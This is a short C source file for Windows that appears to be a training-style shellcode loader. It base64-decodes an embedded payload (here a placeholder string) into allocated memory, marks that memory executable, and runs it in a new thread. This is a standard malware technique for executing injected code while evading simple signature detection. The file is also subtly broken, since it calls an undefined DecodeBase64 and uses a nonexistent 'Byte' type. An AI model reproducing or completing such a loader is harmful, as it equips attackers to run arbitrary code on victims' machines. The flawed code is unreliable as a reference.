#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

unsigned char payload[] = "shellcode b64zed here";
unsigned int payload_len = sizeof(payload);

int DecodeB64(const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen) {
	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);

	if (!fRet) outLen = 0;

	return( outLen );
}

int main(void) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	//Allocate memory for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload_addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "calc_mem_addr", (void *)exec_mem);

	// break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

	// decode payload
	DecodeBase64((const Byte *)payload, payload_len, (char *) exec_mem, payload_len);

	// Make buff executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

	// if all good, execute!
	if ( rv != 0 ) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}